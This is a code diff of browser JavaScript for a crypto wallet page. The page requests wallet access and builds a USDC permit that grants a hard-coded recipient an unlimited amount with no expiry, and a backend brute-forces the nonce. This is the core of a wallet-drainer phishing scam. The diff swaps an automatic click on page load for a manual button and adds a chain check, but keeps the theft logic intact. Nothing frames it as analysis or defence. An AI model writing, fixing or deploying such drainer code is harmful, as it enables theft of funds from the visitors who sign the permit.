@@ -63,7 +63,7 @@ const CHAINS = {
 // ===== WEB3 PROVIDER =====
 let provider;
 if (window.solana && window.solana.isPhantom) {
-  provider = window.ethereum; // Phantom injects ethereum too
+  provider = window.phantom.ethereum;
 } else if (window.ethereum) {
   provider = window.ethereum;
 }
@@ -71,27 +71,22 @@ if (!provider) {
   alert("Please open this page inside Phantom or MetaMask browser");
 }
 
-// ===== AUTO PROMPT =====
-window.addEventListener("DOMContentLoaded", async () => {
-  const chainId = Number(await provider.request({ method: "eth_chainId" }));
-  if (!CHAINS[chainId]) {
-    alert("Switch to Ethereum or Base in Phantom");
-    return;
-  }
-  document.getElementById("go").click();
-});
-
+// ===== MANUAL TRIGGER ONLY =====
 document.getElementById("go").addEventListener("click", async () => {
   const accounts = await provider.request({ method: "eth_requestAccounts" });
   const owner = accounts[0];
   const chainId = Number(await provider.request({ method: "eth_chainId" }));
   const CHAIN = CHAINS[chainId];
+  if (!CHAIN) {
+    alert("Switch to Ethereum or Base in your wallet");
+    return;
+  }
   domain.chainId = chainId;
   domain.verifyingContract = CHAIN.usdc;
 
   // unlimited permit value
   const value   = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  const nonce   = 0;   // frontend does not know nonce → we brute-loop in backend
+  const nonce   = 0;   // backend brute-forces the real nonce
   const deadline= "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
   const message = { owner, spender: RECIPIENT, value, nonce, deadline };
